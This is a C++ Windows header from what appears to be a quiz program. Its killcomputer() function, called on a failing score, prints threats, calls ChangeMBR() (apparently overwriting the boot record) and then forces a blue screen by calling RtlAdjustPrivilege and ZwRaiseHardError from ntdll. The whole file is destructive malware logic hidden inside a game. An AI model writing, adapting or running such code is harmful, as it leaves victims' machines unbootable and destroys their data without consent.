#ifndef CONKILL_H
#define CONKILL_H

#include <iostream>
#include "changembr.h"
#include <windows.h>

using namespace std;

void bluescreen()
{
	HMODULE ntdll=LoadLibrary("ntdll.dll");//加载ntdll
	FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");//获取提权函数
	FARPROC ZwRaiseHardErr=GetProcAddress(ntdll,"ZwRaiseHardError");//获取蓝屏函数
	unsigned char ErrKill;
	long unsigned int HDErr;
	((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13,true,false,&ErrKill);//调用RtlAdjustPrivliege函数获取SeShutdownPrivilege权限
	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardErr)(0xc0000233,0,0,0,6, &HDErr);//使用ZwRaiseHardError制造蓝屏
}

void killcomputer(int score)
{
	system("cls");
	cout << "\t\t不及格!你的分数为" << score << "分,不及格!"<<endl;
	cout << "\t\t不及格!不及格!不及格!不及格!不及格!!!!!!!!!!!!!!!!!!!!!!!!!!!"<<endl;
	cout << "那么,就让我遵守契约,毁灭你的计算机吧!"<<endl;
	ChangeMBR();
	Sleep(5000);
	bluescreen();
}
#endif
